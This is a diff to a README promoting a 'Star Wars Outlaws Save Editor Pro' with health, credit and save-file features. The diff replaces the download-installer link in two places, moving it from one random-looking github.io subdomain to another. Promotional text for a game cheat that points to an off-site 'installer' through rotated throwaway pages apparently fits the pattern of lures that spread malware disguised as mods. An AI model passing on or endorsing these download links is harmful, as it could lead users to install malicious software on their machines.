@@ -2,7 +2,7 @@
 
 Star Wars Outlaws Save Editor Pro is a dedicated modification tool designed to elevate your experience in Star Wars Outlaws. It provides a suite of features to customize gameplay, including health management, credit generation, and save file enhancements. This tool is optimized for Windows 10 and Windows 11, with regular updates throughout 2026 to ensure compatibility and performance.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -77,7 +77,7 @@ All updates are free and available through the download page.
 
 Get the latest version of Star Wars Outlaws Save Editor Pro from the official source.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
